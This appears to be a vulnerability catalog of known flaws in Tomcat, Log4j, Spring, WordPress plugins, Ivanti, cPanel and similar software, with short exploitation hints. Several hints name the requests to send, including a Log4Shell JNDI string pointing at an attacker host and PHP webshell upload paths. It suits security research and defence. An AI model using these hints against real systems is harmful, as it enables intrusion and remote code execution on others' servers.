title: Tomcat partial PUT RCE via JSESSIONID deserialization
description: DefaultServlet con readonly=false permite PUT con Content-Range parcial. Combinando con cookie JSESSIONID, atacante puede deserializar payload arbitrario y conseguir RCE.

title: Ghostcat — AJP file read via port 8009
description: Tomcat AJP connector permite lectura arbitraria de archivos del servlet (incluyendo /WEB-INF/web.xml) si AJP expuesto.
poc: Send AJP request a port 8009 con Servlet path traversal

title: Tomcat RewriteValve traversal — WEB-INF bypass
description: RewriteValve normaliza antes de URL decode → bypass de check WEB-INF/META-INF.

title: Spring4Shell — Spring Framework RCE via class.module.classLoader
description: Spring Beans con tomcat-embed permite override de class.module.classLoader.resources.context.parent.pipeline → RCE.

title: Spring path traversal en static resource handlers
description: Spring's StaticResourceMappingHandler normaliza paths después de checks → bypass para acceso a archivos protegidos.

title: Spring Web ${} SpEL injection en mvc:mapping
description: Spring MVC con mvc:mapping inyectable cuando se usa ** wildcard.

title: Apache mod_rewrite filename confusion (Orange Tsai BH2024)
description: mod_rewrite con flag `?` en RewriteRule permite bypass de access control basado en filename.

title: Apache backend information disclosure via crafted request
description: Backend headers/sessions cookies expuestos a malicious frontend request.
poc: Crafted Header smuggling al backend Apache

title: Apache mod_proxy crash via crafted request
description: DoS vía crafted request en mod_proxy.

title: Apache 2.4.49 path traversal RCE
description: Path normalization bypass permite traversal y RCE si CGI habilitado.

title: Apache 2.4.50 incomplete fix de CVE-2021-41773
description: Bypass del fix anterior con double encoding.

title: Log4Shell — Log4j2 JNDI lookup RCE
description: Log4j2 evalúa ${jndi:ldap://...} en cualquier input loggeado → RCE remoto.
poc: Inyectar ${jndi:ldap://attacker.com/x} en User-Agent, X-Forwarded-For, body JSON, etc.

title: Liferay Portal JSON web service deserialization RCE
description: JSONWS API expuesta permite deserialización de objetos arbitrarios → RCE pre-auth.
poc: POST /api/jsonws/expandocolumn/add-column con object con clase malicious

title: WordPress wp-admin file upload bypass
description: wp-admin upload acepta extensiones peligrosas con bypass de mime check.

title: WordPress Paid Memberships Pro <2.9.8 SQL Injection
description: Plugin Paid Memberships Pro permite SQLi pre-auth via /wp-json/pmpro/v1/orders.

title: Drupalgeddon 2 — Drupal RCE via #pre_render
description: Drupal Render API permite injection de #pre_render functions → RCE pre-auth.

title: Drupal SA-CORE-2019-003 RESTful Web Services unserialize RCE
description: Drupal 8 con módulo RESTful Web Services + módulo HAL permite deserialización pre-auth.

title: ActiveMQ OpenWire deserialization RCE
description: OpenWire protocol permite deserialización de objetos arbitrarios → RCE.
poc: Send malicious OpenWire packet a port 61616

title: Confluence Data Center privilege escalation pre-auth
description: /setup/setupadministrator.action permite create admin sin auth.

title: Confluence OGNL injection pre-auth RCE
description: URL-based OGNL injection en endpoints que aceptan label expressions.

title: Jenkins CLI arbitrary file read
description: args4j parser convierte @file a contenido del archivo → file read pre-auth.

title: Jenkins file read via path traversal
description: GET /static/xxx/../config.xml revela secrets.

title: GitLab ExifTool RCE in image upload pre-auth
description: ExifTool desactualizado en GitLab permite RCE via upload image con metadata maliciosa.
poc: POST /uploads con DjVu file containing payload

title: RECON — SAP NetWeaver create admin pre-auth
description: /CTCWebService permite crear usuario admin sin autenticación.

title: Leaky Vessels — runc container escape
description: WORKDIR en Dockerfile + procfs file descriptor leak → host filesystem access.
poc: Exploit en build chain de container

title: cPanel reflected XSS unauthenticated en /cpsess
description: Pre-auth XSS reflejado en /cpsess<id>/scripts/

title: Apache Struts file upload path traversal RCE
description: FileUploadInterceptor permite manipulación de filename con .. → write a path arbitrario.
poc: POST con multipart upload + filename con path traversal

title: D-Link NAS pre-auth RCE via /cgi-bin/nas_sharing.cgi
description: Backdoor account + command injection en query string.

title: TeamCity authentication bypass pre-auth
description: Routing path normalization permite bypass de auth para crear admin.

title: Spring Web open redirect via UriComponentsBuilder
description: UriComponentsBuilder.build() puede crear URLs hacia hosts arbitrarios.

title: HTTP/2 Rapid Reset DoS
description: HTTP/2 RST_STREAM flood permite DoS amplificado.

title: WebLogic OPSS deserialization RCE
description: /_async/AsyncResponseService deserializa payloads arbitrarios.

title: WebLogic IIOP deserialization pre-auth RCE
description: IIOP protocol expuesto + Apache Commons Collections gadget → RCE.

title: CrushFTP authentication bypass via header smuggling
description: Bypass de auth check con header Cookie/Authorization smuggled.

title: Apache HTTP/2 CONTINUATION flood DoS
description: Memory exhaustion via repeated CONTINUATION frames.
poc: Send HTTP/2 stream with infinite CONTINUATION frames

title: Elasticsearch privilege escalation via API tokens
description: API tokens de un user pueden escalar a otro user con permisos cruzados.
poc: Use crafted API token in Authorization header

title: Struts 2 REST plugin XStream deserialization RCE
description: XStream deserialization en REST plugin permite RCE pre-auth.

title: Confluence improper authorization — data wipe
description: Endpoint admin pre-auth permite data wipe / reset to fresh state.

title: Tomcat error response info disclosure
description: Stack trace de error puede revelar partes del request body de otros users.
poc: Crafted malformed request, leer error response

title: XZ Utils backdoor — sshd RCE via systemd-notify
description: Backdoor en xz/liblzma 5.6.0/5.6.1 → RCE en sshd via systemd. Linux distros sólo.

title: Next.js middleware authorization bypass
description: Header x-middleware-subrequest permite bypass de middleware checks.

title: Aviatrix Controller — unauthenticated RCE via shell metacharacter injection
description: API endpoints aceptan input del usuario sin sanitización → command injection y RCE pre-auth.
poc: POST /v1/api con cloud_type que contenga shell metachars → exec

title: Ollama — file read + RCE via path traversal en /api/pull
description: Endpoint /api/pull acepta digest path con .. → escritura arbitraria + RCE.

title: PHP CGI Windows — argument injection via %ADD encoding
description: Encoding 0xAD (soft hyphen) bypassa best-fit mapping en PHP CGI Windows → argument injection → RCE.

title: Confluence Data Center — authenticated RCE via Add Language injection
description: Add Language admin function permite upload de Java class files → RCE post-auth.

title: Roundcube Webmail — stored XSS via SVG animate href
description: Email con SVG <animate xlink:href=javascript:...> ejecuta XSS al abrir el email.

title: Cleo Harmony/VLTrader/LexiCom — unauthenticated RCE via autorun directory
description: Servicio escribe en autorun/ sin validación → execute arbitrary commands. Explotado en Clop ransomware 2024.
poc: POST con file upload to autorun directory containing PowerShell payload

title: Ivanti VTM — auth bypass via crafted request
description: Auth bypass en admin panel via manipulación de session URL.
poc: GET /apps/zxtm/login.cgi con crafted params bypasses auth

title: ArgoCD — login DoS via concurrent OIDC reqs
description: Login endpoint sin rate limit → DoS via concurrent OIDC token validations.

title: OpenSSH — MitM via VerifyHostKeyDNS overflow
description: Cliente con VerifyHostKeyDNS=yes acepta DNS keys grandes → atacante puede impersonar servidor.
poc: MitM SSH con cert spoofed en DNS query

title: Apache HTTPd — handler config bypass via mod_proxy
description: AddType+SetHandler bypass via crafted URL → access a .phps source code.

title: Docker AuthZ plugin bypass — privilege escalation
description: Empty body + Content-Length: 0 bypassa AuthZ plugin → root command execution.

title: OpenSSH — regreSSHion variant on FreeBSD via blhelper
description: Race condition signal handler en sshd → root RCE pre-auth (~10000 attempts).
poc: Many concurrent ssh attempts triggering signal handler races

title: Zimbra — postjournal command injection RCE
description: SMTP postjournal recibe header maliciosa con shell metachars → RCE pre-auth.
poc: Send SMTP message con malicious CC header

title: Grafana — SQL Expressions duckdb command injection RCE
description: Feature SQL Expressions invoca duckdb sin sandboxing → RCE post-auth viewer-level.
poc: POST /api/ds/query con DuckDB shell command via SELECT load_extension()

title: Cobbler — XMLRPC default credentials auth bypass
description: Credenciales por defecto cobbler/cobbler nunca se cambian → RCE pre-auth via XMLRPC.
poc: POST /cobbler_api con login(cobbler, cobbler) → ejecutar API methods

title: GitHub Enterprise Server — git push X-Stat header injection RCE
description: babeld (GitHub's internal git proxy) fails to sanitize push-option values before embedding them into internal X-Stat service headers (semicolon-delimited). Authenticated user with push access can inject custom_hooks_dir + repo_pre_receive_hooks fields, achieving arbitrary command execution as the git service user. Wiz disclosed 2026-03-04, public 2026-04-28; 88% of GHES instances unpatched at disclosure.

title: Apache httpd 2.4.66 mod_http2 — double-free in h2_mplx.c stream cleanup (DoS / RCE)
description: HTTP/2 HEADERS frame followed by RST_STREAM with non-zero error code on the same stream triggers duplicate cleanup → double-free in mod_http2. Trivial DoS on any default deployment with mod_http2 + multi-threaded MPM; RCE possible when APR uses mmap allocator (Debian + official Docker images). MPM prefork unaffected. Disclosed 2026-05-05.
poc: Send HTTP/2 HEADERS frame followed immediately by RST_STREAM(error=CANCEL) on stream 1 — repeat → worker crash. Exploit framework: nghttp2 + custom client.

title: cPanel & WHM — CRLF injection in session writer → unauth admin bypass
description: cpsrvd writes a session file to disk before authentication. Malformed whostmgrsession cookie skips encryption; \r\n injected into pass= field promotes attacker to authenticated admin. CISA KEV; ~1.5M instances exposed; in-the-wild exploitation since 2026-02-23. Disclosed 2026-04-28.

title: MOVEit Automation — pre-auth backend command port bypass → admin takeover
description: Crafted request to MOVEit Automation backend command port is processed before any authentication logic, granting unauthenticated remote attacker full administrative control over file-transfer workflows. CVSS 9.8. Disclosed 2026-05-04.
poc: Crafted SOAP/JSON-RPC request to /Admin endpoint on MOVEit Automation service port (default 8080/8443) bypasses login flow.

title: Ivanti EPMM — bash arithmetic-expansion RCE via /mifs/c/appstore/fob/ params
description: Legacy bash script /mi/bin/map-appstore-url uses st and h URL parameters in arithmetic context — bash command substitution executes attacker payload as the Tomcat user. Pre-auth RCE; actively exploited in the wild against gov/healthcare/manufacturing. CISA KEV. CVSS 9.8.

title: Ivanti EPMM — bash injection RCE via /mifs/c/aftstore/fob/ (Android File Transfer)
description: Same root cause as CVE-2026-1281 (unsafe bash interpolation) but in /mi/bin/map-aft-store-url script. Pre-auth RCE via crafted GET requests to /mifs/c/aftstore/fob/ endpoint.

title: FortiClient EMS — pre-auth API access bypass → RCE
description: Improper access control in FortiClient EMS API allows crafted requests to bypass authentication and authorization, achieving code execution on the underlying server. Active exploitation detected 2026-03-31; advisory 2026-04-04; CISA KEV 2026-04-06. Patch 7.4.7. CVSS 9.1.
poc: POST /api/v1/management/admin (with crafted Authorization header / missing token) → privileged action accepted.

title: ShareFile Storage Zone Controller — auth bypass via Response.Redirect(false) on /ConfigService/Admin.aspx
description: Authentication check uses httpContext.Response.Redirect(redirectPath, false) — second arg false means execution continues after redirect (Execution After Redirect, CWE-698). Attacker can reach admin endpoints despite redirect to login.
poc: GET /ConfigService/Admin.aspx → 302 redirect but body still served; modify Network Share Location to webroot path.

title: ShareFile Storage Zone Controller — webshell upload via ZIP unzip=true on /upload.aspx
description: Chained with CVE-2026-2699: after pointing Network Share Location at webroot, attacker uploads ZIP containing .aspx via /upload.aspx?unzip=true — files extracted preserving extension → RCE. Requires HMAC-SHA256 + AES Zone Secret (decryptable via hardcoded salt p3510060xfZ2s9). Patched in 5.12.4 (2026-03-10).

title: Vvveb — unauth code injection via subdir param in installer (env.php)
description: Installation endpoint writes the subdir POST parameter unsanitized into env.php inside a define() statement. Attacker terminates the string context and injects arbitrary PHP — executes on every subsequent request that loads env.php. Pre-auth RCE as web user. CVSS 9.8. Disclosed 2026-04-20.

versions_affected: Subscription Edition,2019,2016 (April 2026 Patch Tuesday and earlier)
title: SharePoint — improper input validation spoofing zero-day (exploited in the wild)
description: Improper input validation in SharePoint allows unauthorized attacker to perform spoofing over network — confidentiality + integrity impact, no availability. Microsoft confirmed 'Exploitation Detected' on April 2026 Patch Tuesday. CVSS 6.5 but actively exploited.
poc: Crafted request to SharePoint endpoint with manipulated input fields exploits validation gap to spoof identity / access sensitive resources.

title: Argo CD — ServerSideDiff endpoint leaks plaintext Kubernetes Secrets
description: ServerSideDiff is the only Argo CD endpoint that does NOT call hideSecretData(). If Application has annotation argocd.argoproj.io/compare-options: IncludeMutationWebhook=true, raw Kubernetes SSA dry-run response (containing real Secret values from etcd) is returned unmasked to any read-only user via grpc-web. CVSS 9.6. Patches 3.2.11, 3.3.9.
poc: POST grpc-web call to /application.ApplicationService/GetApplicationSyncWindows or ServerSideDiff endpoint as read-only user → response includes base64-decoded Secret data.

title: React Server Components — pre-auth RCE via unsafe deserialization of Server Function payloads
description: react-server-dom-* unsafely deserializes payloads from HTTP requests to Server Function endpoints (CWE-502). Pre-auth RCE; attributed to china-nexus 'react2shell' campaign. CISA KEV (2025-12-05). CVSS 10.0.
poc: POST to a Server Function endpoint with crafted RSC payload triggering JS object deserialization → arbitrary code in node process.

title: WP User Registration & Membership — auth bypass / privilege escalation to admin
description: Improper Privilege Management (CWE-269) in User Registration & Membership WordPress plugin lets remote attacker gain full administrative access without valid credentials. CVSS 9.8.
poc: POST /wp-admin/admin-ajax.php?action=user_registration_membership_register with crafted role/user_id parameters bypasses capability checks.

versions_affected: WPvivid Backup & Migration plugin (early 2026 versions, see vendor)
title: WP WPvivid Backup & Migration — unauth arbitrary PHP file upload → RCE
description: Missing authorization on file upload endpoint of WPvivid Backup & Migration plugin allows unauthenticated attacker to upload and execute arbitrary PHP files. CVSS 9.8.
poc: POST /wp-admin/admin-ajax.php?action=wpvivid_upload_files with multipart PHP shell payload.

title: WP Quick Playground — unauth arbitrary file upload via REST + sync code
description: Insufficient authorization on REST API endpoints exposes a sync code; attacker retrieves it then uploads arbitrary PHP via path traversal → unauth RCE. Affects all versions ≤1.3.1.
poc: GET /wp-json/quick-playground/v1/sync-code → sync_code; POST /wp-json/quick-playground/v1/upload?path=../../../shell.php (with sync_code header) and PHP body.

versions_affected: Kali Forms plugin (2026 vulnerable releases — see Wordfence advisory)
title: WP Kali Forms — unauth RCE actively exploited in the wild (CVSS 9.8)
description: Kali Forms WordPress plugin allows unauthenticated remote code execution; mass-exploitation observed. CVSS 9.8. Wordfence reported active campaigns.
poc: POST /wp-admin/admin-ajax.php?action=kaliforms_form_submit with crafted form payload triggering unsafe field handler.

title: Adobe ColdFusion — path traversal allowing access outside intended scope
description: Improper limitation of pathname to a restricted directory (CWE-22) in Adobe ColdFusion 2023.18 / 2025.6 and earlier. Low-priv attacker bypasses controls to read files / cause DoS. Patched in CF 2025 Update 7 / 2023 Update 19 (April 2026 Patch Tuesday). CVSS 7.7.
